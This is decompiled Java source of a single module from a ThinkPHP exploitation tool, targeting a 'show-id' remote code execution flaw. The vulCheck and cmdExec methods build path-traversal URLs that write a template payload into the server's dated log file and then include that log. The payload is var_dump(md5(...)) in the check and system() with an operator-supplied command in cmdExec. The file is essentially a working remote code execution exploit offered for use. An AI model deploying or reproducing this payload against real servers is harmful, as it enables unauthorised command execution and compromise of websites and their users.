/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.time.LocalDate;
/*    */ import java.time.format.DateTimeFormatter;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_index_showid_rce
/*    */   implements BaseExp {
/* 13 */   private String results = null;
/* 14 */   HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 18 */     url = url + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]";
/* 19 */     HttpTool.get(url, this.property);
/* 20 */     LocalDate date = LocalDate.now();
/* 21 */     DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");
/* 22 */     url = url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C" + date.format(formatter) + ".log'";
/* 23 */     Response response = HttpTool.get(url, this.property);
/* 24 */     if (response.getText().contains("56540676a129760a3")) {
/* 25 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 26 */       return this.results;
/*    */     } 
/* 28 */     if (response.getError() != null) {
/* 29 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 30 */       return this.results;
/*    */     } 
/* 32 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*    */     
/* 34 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 39 */     url = url + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system(\"" + cmd + "\")}]";
/* 40 */     HttpTool.get(url, this.property);
/* 41 */     LocalDate date = LocalDate.now();
/* 42 */     DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");
/* 43 */     url = url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C" + date.format(formatter) + ".log'";
/* 44 */     Response response = HttpTool.get(url, this.property);
/* 45 */     if (response.getError() == null) {
/* 46 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 48 */       this.results = response.getError();
/*    */     } 
/* 50 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 55 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_index_showid_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */